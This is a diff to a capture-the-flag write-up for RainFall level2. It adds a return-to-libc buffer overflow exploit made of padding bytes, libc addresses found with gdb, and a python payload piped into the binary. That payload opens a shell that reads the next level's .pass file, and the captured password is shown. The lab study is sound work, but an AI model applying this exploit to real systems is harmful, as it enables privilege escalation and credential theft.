@@ -96,9 +96,50 @@ HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH>HHHHHHHHHHHH>`ï
 cat /home/user/level3
 level2@RainFall:~$ 
 ```
+> don't work beause /bin/bash check uid at exec time
 
 offset = 'H' * 80
+
 ret = '\x3e\x85\x04\x08'
+
 system = '\x60\xb0\xe6\xb7'
+
 exit = '\xe0\xeb\xe5\xb7'
+
 "/bin/bash" = '\x1b\xf9\xff\xbf'
+
+## With /bin/sh
+
+```sh
+(gdb) info proc map
+process 3859
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
+	 0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
+	0xb7e2b000 0xb7e2c000     0x1000        0x0 
+	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd2000 0xb7fd5000     0x3000        0x0 
+	0xb7fdb000 0xb7fdd000     0x2000        0x0 
+	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
+0xb7f8cc58
+1 pattern found.
+```
+
+## Exploit
+
+```sh
+level2@RainFall:~$ (python -c "print('H' * 80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7'  + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7')"; cat) | ./level2
+HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH>HHHHHHHHHHHH>`ï¿½ï¿½ï¿½ï¿½ï¿½Xï¿½ï¿½ï¿½
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+```
